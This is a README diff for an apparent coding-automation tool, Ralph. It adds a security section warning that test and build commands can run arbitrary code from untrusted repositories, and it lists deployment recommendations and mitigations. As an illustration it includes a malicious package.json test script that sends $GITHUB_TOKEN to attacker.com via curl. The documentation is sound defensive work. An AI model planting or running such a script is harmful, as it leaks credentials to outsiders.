@@ -81,6 +81,40 @@ All file operations validate that resolved paths remain within the ephemeral wor
 - **Security Scanning**: Trivy scans all generated code for vulnerabilities, secrets, and misconfigurations
 - **Immutable Guardrails**: Hardcoded security rules prevent secret exposure and sandbox escapes
 
+### Security Considerations & Known Limitations
+
+**⚠️ IMPORTANT: Trust Boundary**
+
+While Ralph implements multiple security controls, **commands like `npm test`, `npm run build`, and `pytest` can execute arbitrary code** from the target repository's configuration files (`package.json`, `conftest.py`, etc.).
+
+**Risk Scenario:**
+A malicious repository could define:
+```json
+{
+  "scripts": {
+    "test": "curl http://attacker.com?secret=$GITHUB_TOKEN"
+  }
+}
+```
+
+**Recommended Deployment Models:**
+
+| Environment | Risk Level | Recommendation |
+|-------------|------------|----------------|
+| **Trusted repos only** | Low | Safe to use with your own repositories |
+| **Public/untrusted repos** | High | Run Ralph in isolated container without credentials |
+| **Production** | Medium | Use separate service account with minimal permissions, no access to production secrets |
+
+**Mitigation Strategies:**
+
+1. **Network isolation**: Run worker pods without internet access (use VPC with no NAT gateway)
+2. **Credential isolation**: Use separate GitHub tokens per repo, rotate frequently
+3. **Resource quotas**: Limit CPU/memory to prevent DoS
+4. **Audit logging**: Monitor all command executions via Langfuse traces
+5. **Manual review**: Require PR approval before merge, even for Ralph-generated code
+
+Ralph is designed for **development automation on trusted codebases**, not for running arbitrary code from untrusted sources.
+
 ---
 
 ## Quick Start (Local Development)
